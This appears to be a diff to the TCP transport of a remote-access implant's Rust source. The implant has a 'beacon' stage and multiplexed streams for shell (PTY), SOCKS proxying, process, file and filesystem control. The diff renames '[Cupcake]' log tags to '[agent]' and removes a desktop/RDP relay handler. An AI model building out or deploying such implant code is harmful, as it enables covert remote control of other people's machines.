@@ -94,7 +94,7 @@ impl Transport for TcpTransport {
                         let stream = match TcpStream::from_std(socket.into()) {
                             Ok(s) => s,
                             Err(_) => {
-                                crate::utils::db_print("[Cupcake] Failed to re-wrap TCP stream");
+                                crate::utils::db_print("[agent] Failed to re-wrap TCP stream");
                                 if attempts >= MAX_ATTEMPTS {
                                     return Err(ClientError::ConnectionError(
                                         "tcp re-wrap failed after max attempts".into(),
@@ -105,7 +105,7 @@ impl Transport for TcpTransport {
                                 continue;
                             }
                         };
-                        crate::utils::db_print("[Cupcake] TCP hardened socket ready.");
+                        crate::utils::db_print("[agent] TCP hardened socket ready.");
 
                         let mut yamux_config = Config::default();
                         // 缓冲区大小：16MB（足够大文件传输，但不会 OOM）
@@ -158,9 +158,9 @@ impl Transport for TcpTransport {
                                                 stream_id, type_buf[0]
                                             ));
                                             use crate::transport::stream_types::{
-                                                YAMUX_STREAM_DESKTOP, YAMUX_STREAM_FILE,
-                                                YAMUX_STREAM_FS, YAMUX_STREAM_PROCESS,
-                                                YAMUX_STREAM_PTY, YAMUX_STREAM_SOCKS,
+                                                YAMUX_STREAM_FILE, YAMUX_STREAM_FS,
+                                                YAMUX_STREAM_PROCESS, YAMUX_STREAM_PTY,
+                                                YAMUX_STREAM_SOCKS,
                                             };
                                             match type_buf[0] {
                                                 YAMUX_STREAM_PTY => {
@@ -213,20 +213,6 @@ impl Transport for TcpTransport {
                                                         use futures_util::AsyncWriteExt;
                                                         let mut s = stream;
                                                         let _ = s.write_all(b"\r\n[!] process module not in Stage0 (beacon)\r\n").await;
-                                                        let _ = s.close().await;
-                                                    }
-                                                }
-                                                YAMUX_STREAM_DESKTOP => {
-                                                    // RDP relay — requires L2 desktop module Loaded
-                                                    #[cfg(feature = "module-loader")]
-                                                    {
-                                                        crate::transport::desktop_bridge::handle_stream(stream).await;
-                                                    }
-                                                    #[cfg(not(feature = "module-loader"))]
-                                                    {
-                                                        use futures_util::AsyncWriteExt;
-                                                        let mut s = stream;
-                                                        let _ = s.write_all(&[0x00u8]).await;
                                                         let _ = s.close().await;
                                                     }
                                                 }
@@ -293,7 +279,7 @@ impl Transport for TcpTransport {
                             }
                         };
 
-                        crate::utils::db_print("[Cupcake] Control established.");
+                        crate::utils::db_print("[agent] Control established.");
                         self.control_stream = Some(control_stream.compat());
                         self.noise_session_key = None;
                         self.reassembler.clear();
@@ -354,14 +340,14 @@ impl Transport for TcpTransport {
                             })?;
                             self.noise_session_key = Some(session_key);
                             crate::utils::db_print(
-                                "[Cupcake] X25519 Noise OK — traffic uses session key",
+                                "[agent] X25519 Noise OK — traffic uses session key",
                             );
                         }
 
                         self.backoff.reset();
                         return Ok(());
                     } else {
-                        crate::utils::db_print("[Cupcake] Socket hardening failed, retrying...");
+                        crate::utils::db_print("[agent] Socket hardening failed, retrying...");
                         if attempts >= MAX_ATTEMPTS {
                             return Err(ClientError::ConnectionError(
                                 "tcp socket harden failed after max attempts".into(),
